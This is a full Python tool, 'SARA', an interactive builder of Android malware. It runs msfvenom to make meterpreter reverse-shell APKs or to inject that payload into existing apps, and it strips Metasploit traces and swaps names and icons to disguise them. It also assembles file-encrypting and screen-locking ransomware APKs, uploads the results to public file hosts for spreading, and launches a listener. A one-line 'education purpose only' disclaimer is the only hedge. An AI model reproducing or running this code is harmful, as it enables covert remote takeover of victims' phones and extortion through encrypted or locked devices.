#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SARA v3.1 - Simple Android Ransomware Attack
"""

import os
import sys
import time
import random
import fileinput
from typing import Optional, Tuple
from pathlib import Path

try:
    from PIL import Image
except ModuleNotFoundError:
    sys.exit("Missing modules. Run: pip install -r requirements.txt")


class Colors:
    """ANSI color codes for terminal output"""
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    RED = '\033[1;91m'
    GREEN = '\033[1;92m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[1;94m'
    GRAY = '\033[90m'


class Config:
    """Application configuration"""
    HIDE_OUTPUT = '> /dev/null 2>&1'
    DEFAULT_HOST = '127.0.0.1'
    DEFAULT_PORT = '4444'
    DEFAULT_ICON = 'data/tmp/icon.png'
    DATA_DIR = 'data'
    
    # Template files
    ENCRYPTER_TEMPLATE = 'data/tmp/encrypter.apk'
    LOCKSCREEN_TEMPLATE = 'data/tmp/lockscreen.apk'
    DECRYPTER_FILE = 'data/tmp/decrypter.apk'
    
    # Signing
    KEYSTORE = 'data/key/debug.jks'
    KEY_ALIAS = 'debugging'
    KEY_PASS = 'debugging'


class Console:
    """Console output utilities"""
    
    @staticmethod
    def clear():
        """Clear terminal screen"""
        os.system("cls" if os.name == "nt" else "clear")
    
    @staticmethod
    def print_slow(text: str, delay: float = 0.008):
        """Print text character by character"""
        for char in text:
            print(char, end='', flush=True)
            time.sleep(delay)
        print()
    
    @staticmethod
    def print_banner():
        """Display application banner"""
        Console.clear()
        c = Colors
        banner = fr"""
{c.GRAY}      ,,                ,,
    (((((              )))))
   ((((((              ))))))
   ((((((              ))))))
    ((((({c.BLUE},r@@@@@@@@@@e,{c.GRAY})))))
     ((({c.BLUE}@@@@@@@@@@@@@@@@{c.GRAY})))
{c.BLUE}      \@@/{c.RED},:::,{c.BLUE}\/{c.RED},:::,{c.BLUE}\@@/
{c.BLUE}     /@@@|{c.RED}:::::{c.BLUE}||{c.RED}:::::{c.BLUE}|@@@\\
{c.BLUE}    / @@@\\{c.RED}':::'{c.BLUE}/\\{c.RED}':::'{c.BLUE}/@@@ \\    {c.RESET}'{c.RED}Beware of Ransomware{c.RESET}'
{c.BLUE}   /  /@@@@@@@//\\\@@@@@@@\  \\        {c.GRAY}version 3.1{c.RESET}
{c.BLUE}  (  /  '@@@@@====@@@@@'  \  )
   \(     /          \     )/
     \   (            )   /
          \          /{c.RESET}
        """
        print(banner)
    
    @staticmethod
    def status(message: str, status: str = 'wait') -> str:
        """Format status message"""
        c = Colors
        sara = f"{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET}"
        
        status_colors = {
            'wait': c.YELLOW,
            'done': c.GREEN,
            'fail': c.RED
        }
        
        color = status_colors.get(status, c.RESET)
        return f"{sara} : {message} ... {color}{status}{c.RESET}"
    
    @staticmethod
    def prompt(label: str) -> str:
        """Get user input with formatted prompt"""
        c = Colors
        user = f"{c.GRAY}<{c.GREEN}user{c.GRAY}>{c.RESET}"
        return input(f"{user} : {label}")


class FileUtils:
    """File operation utilities"""
    
    @staticmethod
    def truncate(text: str, max_len: int = 20) -> str:
        """Truncate string with ellipsis"""
        return text[:max_len - 3] + "..." if len(text) > max_len else text
    
    @staticmethod
    def replace_in_file(old: str, new: str, filepath: str) -> bool:
        """Replace string in file using sed"""
        try:
            os.system(f"sed -i 's#{old}#{new}#g' {filepath}")
            result = os.popen(f"grep -rc '{new}' {filepath}", 'r').readline().strip()
            return int(result) > 0
        except Exception:
            return False
    
    @staticmethod
    def replace_in_file_python(old: str, new: str, filepath: str):
        """Replace string in file using Python"""
        for line in fileinput.input(filepath, inplace=True):
            print(line.replace(old, new), end="")
    
    @staticmethod
    def copy_dir(src: str, dst: str) -> bool:
        """Copy directory and remove source"""
        os.system(f"cp -rf {src} {dst} {Config.HIDE_OUTPUT}")
        os.system(f"rm -rf {src}")
        return os.path.isdir(dst)


class APKOperations:
    """Handle APK file operations"""
    
    @staticmethod
    def decompile(apk_path: str) -> str:
        """Decompile APK using apktool"""
        output_dir = Path(apk_path).stem
        
        print(Console.status(f"decompile '{output_dir}.apk' using apktool", "wait"), end='\r')
        os.system(f"apktool d {apk_path} {Config.HIDE_OUTPUT}")
        
        if not os.path.isdir(output_dir):
            print(Console.status(f"decompile '{output_dir}.apk' using apktool", "fail"))
            sys.exit(1)
        
        print(Console.status(f"decompile '{output_dir}.apk' using apktool", "done"))
        os.remove(apk_path)
        return output_dir
    
    @staticmethod
    def recompile(dir_path: str) -> str:
        """Recompile APK using apktool"""
        apk_path = f"{dir_path}.apk"
        
        print(Console.status(f"recompile '{dir_path}' using apktool", "wait"), end='\r')
        os.system(f"apktool b {dir_path} -o {apk_path} {Config.HIDE_OUTPUT}")
        
        # Try with aapt2 if first attempt fails
        if not os.path.isfile(apk_path):
            print(Console.status(f"recompile '{dir_path}' using apktool (aapt2)", "wait"), end='\r')
            os.system(f"apktool b {dir_path} -o {apk_path} --use-aapt2 {Config.HIDE_OUTPUT}")
        
        time.sleep(0.5)
        
        if not os.path.isfile(apk_path):
            print(Console.status(f"recompile '{dir_path}' using apktool", "fail"))
            sys.exit(1)
        
        print(Console.status(f"recompile '{dir_path}' using apktool", "done"))
        os.system(f"rm -rf {dir_path} {Config.HIDE_OUTPUT}")
        return apk_path
    
    @staticmethod
    def sign(apk_path: str) -> str:
        """Sign APK using uber-apk-signer"""
        base_name = Path(apk_path).stem
        
        print(Console.status(f"signing '{apk_path}' using uber-apk-signer", "wait"), end='\r')
        
        cmd = (f"java -jar data/bin/ubersigner.jar -a {apk_path} "
               f"--ks {Config.KEYSTORE} --ksAlias {Config.KEY_ALIAS} "
               f"--ksPass {Config.KEY_PASS} --ksKeyPass {Config.KEY_PASS} "
               f"{Config.HIDE_OUTPUT}")
        os.system(cmd)
        
        # Cleanup and rename
        os.system(f"rm -rf {apk_path} *.idsig {Config.HIDE_OUTPUT}")
        signed_path = f"{base_name}.apk"
        os.system(f"cp -rf {base_name}-aligned-signed.apk {signed_path} {Config.HIDE_OUTPUT}")
        os.system(f"rm -rf {base_name}-aligned-signed.apk {Config.HIDE_OUTPUT}")
        
        if not os.path.isfile(signed_path):
            print(Console.status(f"signing '{apk_path}' using uber-apk-signer", "fail"))
            sys.exit(1)
        
        print(Console.status(f"signing '{apk_path}' using uber-apk-signer", "done"))
        return signed_path
    
    @staticmethod
    def update_icon(icon_path: str, apk_dir: str):
        """Update all launcher icons in APK"""
        print(Console.status(f"add '{Path(icon_path).name}' into 'ic_launcher'", "wait"), end='\r')
        
        icon_files = os.popen(f"find -O3 -L {apk_dir} -name 'ic_launcher.png'", 'r').read().splitlines()
        
        for icon_file in icon_files:
            if not os.path.isfile(icon_file):
                print(Console.status(f"add '{Path(icon_path).name}' into 'ic_launcher'", "fail"))
                sys.exit(1)
            
            with Image.open(icon_file) as img:
                size = f"{img.width}x{img.height}"
                temp_icon = f"lock-{Path(icon_path).name}"
                
                os.system(f"cp -R {icon_path} {temp_icon}")
                os.system(f"mogrify -resize {size} {temp_icon}")
                os.system(f"cp -R {temp_icon} {icon_file}")
                os.system(f"rm -rf {temp_icon}")
        
        print(Console.status(f"add '{Path(icon_path).name}' into 'ic_launcher'", "done"))


class APKModifier:
    """Modify APK properties"""
    
    @staticmethod
    def update_version(apk_dir: str) -> Tuple[str, str]:
        """Update version code and name"""
        version_code = str(random.randint(1, 9))
        version_name = f"{version_code}.0"
        app_name = Path(apk_dir).name
        
        # Update version code
        yml_path = f"{apk_dir}/apktool.yml"
        print(Console.status(f"add '{version_code}' into '{yml_path}'", "wait"), end='\r')
        
        current_code = os.popen(f"cat {yml_path} | grep 'versionCode'", 'r').readline().strip()
        os.system(f"sed -i \"s/{current_code}/versionCode: '{version_code}'/g\" {yml_path}")
        print(Console.status(f"add '{version_code}' into '{yml_path}'", "done"))
        
        # Update version name
        print(Console.status(f"add '{version_name}' into '{yml_path}'", "wait"), end='\r')
        
        current_name = os.popen(f"cat {yml_path} | grep 'versionName'", 'r').readline().strip()
        full_version = f"{version_name} by @{app_name}"
        os.system(f"sed -i \"s/{current_name}/versionName: {full_version}/g\" {yml_path}")
        print(Console.status(f"add '{version_name}' into '{yml_path}'", "done"))
        
        return version_code, version_name


class TrojanBuilder:
    """Build trojan APK files"""
    
    @staticmethod
    def generate_raw(host: str, port: str, name: str = 'trojan') -> str:
        """Generate raw trojan using msfvenom"""
        apk_path = f"{name}.apk"
        
        print(Console.status(f"generate '{apk_path}' using msfvenom", "wait"), end='\r')
        
        cmd = (f"msfvenom -p android/meterpreter/reverse_tcp "
               f"lhost={host} lport={port} -a dalvik --platform android "
               f"-o {apk_path} {Config.HIDE_OUTPUT}")
        os.system(cmd)
        
        if not os.path.isfile(apk_path):
            print(Console.status(f"generate '{apk_path}' using msfvenom", "fail"))
            sys.exit(1)
        
        print(Console.status(f"generate '{apk_path}' using msfvenom", "done"))
        return apk_path
    
    @staticmethod
    def generate_infected(host: str, port: str, original_apk: str) -> str:
        """Inject trojan into existing APK"""
        base_name = Path(original_apk).stem
        infected_apk = f"{base_name}-infected.apk"
        
        print(Console.status(f"infection '{base_name}.apk' using msfvenom", "wait"))
        print()
        
        cmd = (f"msfvenom -x {original_apk} -p android/meterpreter/reverse_tcp "
               f"lhost={host} lport={port} -a dalvik --platform android "
               f"-o {infected_apk}")
        os.system(cmd)
        
        if not os.path.isfile(infected_apk):
            print(Console.status(f"infection '{base_name}-infected.apk' using msfvenom", "fail"))
            sys.exit(1)
        
        print(f"\n{Colors.RESET}" + Console.status(f"infection '{base_name}-infected.apk' using msfvenom", "done"))
        return infected_apk
    
    @staticmethod
    def customize(apk_path: str, name: str, icon_path: str) -> str:
        """Customize trojan APK"""
        apk_dir = APKOperations.decompile(apk_path)
        
        # Update app name
        strings_xml = f"{apk_dir}/res/values/strings.xml"
        FileUtils.replace_in_file('"app_name">app_name', f'"app_name">{name}', strings_xml)
        FileUtils.replace_in_file('MainActivity', name, strings_xml)
        
        # Add custom icon
        APKOperations.update_icon(icon_path, apk_dir)
        
        # Remove metasploit references
        grep_result = os.popen(f"grep -rc 'metasploit' {apk_dir}", 'r').read().splitlines()
        for line in grep_result:
            parts = line.split(':')
            if len(parts) == 2 and int(parts[1]) > 0:
                FileUtils.replace_in_file('metasploit', apk_dir, parts[0])
        
        # Rename package directory
        old_dir = f"{apk_dir}/smali/com/metasploit/"
        new_dir = f"{apk_dir}/smali/com/{apk_dir}/"
        if os.path.exists(old_dir):
            FileUtils.copy_dir(old_dir, new_dir)
        
        # Update version
        APKModifier.update_version(apk_dir)
        
        # Recompile and sign
        new_apk = APKOperations.recompile(apk_dir)
        return APKOperations.sign(new_apk)


class RansomwareBuilder:
    """Build ransomware APK files"""
    
    @staticmethod
    def build_file_locker(name: str, desc: str, icon_path: str) -> str:
        """Build file encryption ransomware"""
        app_dir = name.lower().replace(' ', '')
        apk_path = f"{app_dir}.apk"
        
        os.system(f"cp -f {Config.ENCRYPTER_TEMPLATE} {apk_path}")
        apk_dir = APKOperations.decompile(apk_path)
        
        # Update strings
        strings_xml = f"{apk_dir}/res/values/strings.xml"
        FileUtils.replace_in_file('"app_name">app_name', f'"app_name">{name}', strings_xml)
        
        # Update smali files
        smali_files = [
            f"{apk_dir}/smali/com/termuxhackersid/services/EncryptionService.smali",
            f"{apk_dir}/smali/com/termuxhackersid/services/DecryptionService.smali",
            f"{apk_dir}/smali/com/termuxhackersid/ui/MainActivity$a.smali",
            f"{apk_dir}/smali/com/termuxhackersid/ui/MainActivity.smali"
        ]
        
        for smali_file in smali_files:
            if 'Encryption' in smali_file or 'Decryption' in smali_file:
                FileUtils.replace_in_file('app_name', name, smali_file)
            FileUtils.replace_in_file('app_desc', desc, smali_file)
        
        # Update icon
        APKOperations.update_icon(icon_path, apk_dir)
        
        # Update version
        APKModifier.update_version(apk_dir)
        
        # Recompile and sign
        new_apk = APKOperations.recompile(apk_dir)
        return APKOperations.sign(new_apk)
    
    @staticmethod
    def build_screen_locker(name: str, head: str, desc: str, passphrase: str, icon_path: str) -> str:
        """Build screen lock ransomware"""
        app_dir = name.lower().replace(' ', '')
        apk_path = f"{app_dir}.apk"
        
        os.system(f"cp -f {Config.LOCKSCREEN_TEMPLATE} {apk_path}")
        apk_dir = APKOperations.decompile(apk_path)
        
        # Update strings
        strings_xml = f"{apk_dir}/res/values/strings.xml"
        FileUtils.replace_in_file('"app_name">app_name', f'"app_name">{name}', strings_xml)
        FileUtils.replace_in_file('app_head', head, strings_xml)
        FileUtils.replace_in_file('app_desc', desc, strings_xml)
        
        # Update passphrase
        print(Console.status(f"add '{passphrase}' as 'passphrase'", "wait"), end='\r')
        service_file = f"{apk_dir}/smali/com/termuxhackers/id/MyService$100000000.smali"
        FileUtils.replace_in_file_python('app_keys', passphrase, service_file)
        print(Console.status(f"add '{passphrase}' as 'passphrase'", "done"))
        
        # Update icon
        APKOperations.update_icon(icon_path, apk_dir)
        
        # Update version
        APKModifier.update_version(apk_dir)
        
        # Recompile and sign
        new_apk = APKOperations.recompile(apk_dir)
        return APKOperations.sign(new_apk)


class FileUploader:
    """Handle file uploads"""
    
    @staticmethod
    def upload(filepath: str) -> Optional[str]:
        """Upload file to various free hosting services"""
        c = Colors
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : do you want to upload '{c.GREEN}{filepath}{c.RESET}' ?
         
         (1) yes, upload to transfer.sh (24h)
         (2) yes, upload to 0x0.st (365 days)
         (3) yes, upload to file.io (1 download)
         (4) yes, upload to temp.sh (3 days)
         (5) no thanks
        """)
        
        choice = Console.prompt("")
        if choice in ('5', '05'):
            return None
        
        print(Console.status(f"upload '{filepath}' into the link", "wait"), end='\r')
        
        link = None
        file_name = Path(filepath).name
        
        try:
            if choice in ('1', '01'):
                cmd = f"curl --upload-file {filepath} https://transfer.sh/{file_name} --silent"
                link = os.popen(cmd, 'r').readline().strip()
            
            elif choice in ('2', '02'):
                cmd = f"curl -F 'file=@{filepath}' https://0x0.st --silent"
                link = os.popen(cmd, 'r').readline().strip()
            
            elif choice in ('3', '03'):
                import re
                cmd = f"curl -F 'file=@{filepath}' https://file.io --silent"
                response = os.popen(cmd, 'r').read()
                match = re.search('"link":"(.*?)"', response)
                if match:
                    link = match.group(1)
            
            elif choice in ('4', '04'):
                cmd = f"curl -F 'file=@{filepath}' https://temp.sh/upload --silent"
                response = os.popen(cmd, 'r').read()
                link = response.strip()
            
            else:
                cmd = f"curl --upload-file {filepath} https://transfer.sh/{file_name} --silent"
                link = os.popen(cmd, 'r').readline().strip()
            
            if not link or 'https' not in link or 'http' not in link:
                raise Exception("Invalid upload response")
            
            print(Console.status(f"upload '{filepath}' into the link", "done"))
            
            Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : your file has been successfully uploaded,
         here is the download link ...
         
         {c.YELLOW}{link}{c.RESET}
         
         {c.GRAY}Note: Link expiration depends on service selected{c.RESET}""")
            
            return link
            
        except Exception as e:
            print(Console.status(f"upload '{filepath}' into the link", "fail"))
            Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : upload failed. You can manually upload to:
         
         - https://transfer.sh
         - https://0x0.st
         - https://pixeldrain.com
         - https://gofile.io
            """)
            return None


class MetasploitListener:
    """Handle Metasploit listener"""
    
    @staticmethod
    def start(host: str, port: str):
        """Start msfconsole listener"""
        c = Colors
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : redirecting to the metasploit console
         payload = '{c.RED}android/meterpreter/reverse_tcp{c.RESET}'
         with host = '{c.YELLOW}{host}{c.RESET}' and port = '{c.YELLOW}{port}{c.RESET}'
         listening as job (0).
        """)
        
        cmd = (f"msfconsole -q -x \"use payload/android/meterpreter/reverse_tcp;"
               f"set lhost {host};set lport {port};exploit -j\"")
        os.system(cmd)


class SARA:
    """Main application class"""
    
    def __init__(self):
        self.user = os.popen('whoami', 'r').readline().strip()
        self.ipv4 = Config.DEFAULT_HOST
    
    def _get_listener_config(self, current_host: str, current_port: str) -> Tuple[str, str]:
        """Get listener configuration from user"""
        c = Colors
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : do you want to start listener ?
         
         (1) yes, i want to set new host and port
         (2) yes, i want to use previous host and port
         (3) no thanks, i want to exit
        """)
        
        choice = Console.prompt("")
        
        if choice in ('1', '01'):
            host = Console.prompt("set host > ") or current_host
            port = Console.prompt("set port > ") or current_port
            return host, port
        elif choice in ('2', '02'):
            return current_host, current_port
        else:
            msg = Console.status('process completed successfully', 'done')
            sys.exit(f"\n{msg}\n")
    
    def custom_trojan(self):
        """Build custom trojan"""
        c = Colors
        Console.print_banner()
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : you can fill or leave blank for using
         default configuration. the default configuration is
         host = '{c.YELLOW}{self.ipv4}{c.RESET}' port = '{c.YELLOW}{Config.DEFAULT_PORT}{c.RESET}' name = '{c.RED}trojan.apk{c.RESET}'
         and icon = '{c.RED}{Config.DEFAULT_ICON}{c.RESET}'.

         custom trojan apk (client)
        """)
        
        name = input(f"         set app name: ") or 'trojan'
        icon = input(f"         set app icon: ")
        if not os.path.isfile(icon):
            icon = Config.DEFAULT_ICON
        
        host = input(f"         set app host: ") or self.ipv4
        port = input(f"         set app port: ") or Config.DEFAULT_PORT
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : well this process takes a few minutes,
         please be patient until the process is complete 
        """)
        
        # Build trojan
        raw_apk = TrojanBuilder.generate_raw(host, port, name.replace(' ', '').replace('.apk', '').lower())
        final_apk = TrojanBuilder.customize(raw_apk, name, icon)
        
        # Upload
        FileUploader.upload(final_apk)
        
        if not os.path.isfile(final_apk):
            msg = Console.status(f"sorry, failed to build '{final_apk}'", 'fail')
            sys.exit(f"\n{msg} :( \n")
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : your trojan apps successfully created
         the application is saved as '{c.GREEN}{final_apk}{c.RESET}'
        """)
        
        # Start listener
        host, port = self._get_listener_config(host, port)
        MetasploitListener.start(host, port)
    
    def infect_trojan(self):
        """Infect existing APK with trojan"""
        c = Colors
        Console.print_banner()
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : you can fill or leave blank for using default config
         the default configuration is apps = '{c.RED}REQUIRED{c.RESET}'
         host = '{c.YELLOW}{self.ipv4}{c.RESET}' and port = '{c.YELLOW}{Config.DEFAULT_PORT}{c.RESET}'.

         infect trojan apk (client)
        """)
        
        original_apk = input(f"         set ori apps: ")
        if not os.path.isfile(original_apk):
            msg = Console.status(f"file '{original_apk}' doesn't exist", 'fail')
            sys.exit(f"{msg}!")
        
        host = input(f"         set app host: ") or self.ipv4
        port = input(f"         set app port: ") or Config.DEFAULT_PORT
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : well this process takes a few minutes,
         please be patient until the process is complete 
        """)
        
        # Build infected trojan
        infected_apk = TrojanBuilder.generate_infected(host, port, original_apk)
        
        # Upload
        FileUploader.upload(infected_apk)
        
        if not os.path.isfile(infected_apk):
            msg = Console.status(f"sorry, failed to build '{infected_apk}'", 'fail')
            sys.exit(f"\n{msg} :( \n")
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : your trojan apps successfully created
         the application is saved as '{c.GREEN}{infected_apk}{c.RESET}'
        """)
        
        # Start listener
        host, port = self._get_listener_config(host, port)
        MetasploitListener.start(host, port)
    
    def custom_file_locker(self):
        """Build custom file locker ransomware"""
        c = Colors
        Console.print_banner()
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : you can fill or leave blank for using default config
         the default configuration is name = '{c.RED}File Locker{c.RESET}'
         desc = '{c.RED}Your File Have Been Encrypted{c.RESET}'
         and icon = '{c.YELLOW}{Config.DEFAULT_ICON}{c.RESET}'.

         custom file locker apk (encrypter)
        """)
        
        name = input(f"         set app name: ") or 'File Locker'
        desc = input(f"         set app desc: ") or 'Your File Have Been Encrypted'
        icon = input(f"         set app icon: ")
        if not os.path.isfile(icon):
            icon = Config.DEFAULT_ICON
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : well this process takes a few minutes,
         please be patient until the process is complete 
        """)
        
        # Build file locker
        encrypter_apk = RansomwareBuilder.build_file_locker(name, desc, icon)
        
        # Copy decrypter
        os.system(f"cp -r {Config.DECRYPTER_FILE} .")
        
        # Upload
        FileUploader.upload(encrypter_apk)
        
        if not os.path.isfile(encrypter_apk):
            msg = Console.status(f"sorry, failed to build '{encrypter_apk}'", 'fail')
            sys.exit(f"\n{msg} :( \n")
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : your file locker apps successfully created
         the encrypter is saved as '{c.GREEN}{encrypter_apk}{c.RESET}'
         the decrypter is saved as '{c.GREEN}decrypter.apk{c.RESET}'
        """)
    
    def custom_screen_locker(self):
        """Build custom screen locker ransomware"""
        c = Colors
        Console.print_banner()
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : you can fill or leave blank for using default config
         the default configuration is name = '{c.RED}Screen Locker{c.RESET}'
         head = '{c.RED}Your Phone Is Locked{c.RESET}'
         desc = '{c.RED}locked by sara@termuxhackers-id{c.RESET}'
         icon = '{c.YELLOW}{Config.DEFAULT_ICON}{c.RESET}' and keys = '{c.YELLOW}s3cr3t{c.RESET}'

         custom lock screen apk (passphrase)
        """)
        
        name = input(f"         set app name: ") or 'Screen Locker'
        head = input(f"         set app head: ") or 'Your Phone Is Locked'
        desc = input(f"         set app desc: ") or 'locked by sara@termuxhackers-id'
        icon = input(f"         set app icon: ")
        if not os.path.isfile(icon):
            icon = Config.DEFAULT_ICON
        passphrase = input(f"         set app keys: ") or 's3cr3t'
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : well this process takes a few minutes,
         please be patient until the process is complete 
        """)
        
        # Build screen locker
        locker_apk = RansomwareBuilder.build_screen_locker(name, head, desc, passphrase, icon)
        
        # Upload
        FileUploader.upload(locker_apk)
        
        if not os.path.isfile(locker_apk):
            msg = Console.status(f"sorry, failed to build '{locker_apk}'", 'fail')
            sys.exit(f"\n{msg} :( \n")
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : your screen locker apps successfully created
         the application is saved as '{c.GREEN}{locker_apk}{c.RESET}'
         the secret key (passphrase) '{c.GREEN}{passphrase}{c.RESET}'
        """)
    
    def menu(self):
        """Display main menu"""
        c = Colors
        Console.print_banner()
        
        Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : Hi user, welcome to @{c.YELLOW}SARA{c.RESET} :)

{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : sara is a simple android ransomware attack
         this tool is made for education purpose only
         the author is not responsible for any loses
         or damage caused by this programs.

{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : can i help you ?
         
         (1) build trojan ransomware ({c.BLUE}metasploit{c.RESET})
         (2) build locker ransomware ({c.BLUE}filelocker{c.RESET})
         (3) build screen ransomware ({c.BLUE}screenlock{c.RESET})
         (4) exit!
        """)
        
        while True:
            choice = Console.prompt("")
            
            if choice in ('1', '01'):
                Console.print_banner()
                Console.print_slow(f"""
{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : ok, you can choose one ...

         (1) build custom trojan ({c.BLUE}metasploit{c.RESET})
         (2) build trojan and infect ({c.BLUE}metasploit{c.RESET})
         (3) back to previous
                """)
                
                while True:
                    sub_choice = Console.prompt("")
                    
                    if sub_choice in ('1', '01'):
                        self.custom_trojan()
                    elif sub_choice in ('2', '02'):
                        self.infect_trojan()
                    elif sub_choice in ('3', '03', 'back'):
                        pass
                    else:
                        print(f"{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : sorry, no command found for: {sub_choice}")
                        continue
                    break
                    
            elif choice in ('2', '02'):
                self.custom_file_locker()
            elif choice in ('3', '03'):
                self.custom_screen_locker()
            elif choice in ('4', '04', 'exit'):
                sys.exit(0)
            else:
                print(f"{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : sorry, no command found for: {choice}")
                continue
            break
        
        input(f"{c.GRAY}<{c.BLUE}sara{c.GRAY}>{c.RESET} : press enter for back to '{c.GREEN}main menu{c.RESET}' (enter) ")
        self.menu()
    
    def run(self):
        """Run the application"""
        try:
            self.menu()
        except KeyboardInterrupt:
            print(f"\n\n{Colors.GRAY}<{Colors.BLUE}sara{Colors.GRAY}>{Colors.RESET} : Goodbye!")
            sys.exit(0)


def main():
    """Application entry point"""
    app = SARA()
    app.run()


if __name__ == '__main__':
    main()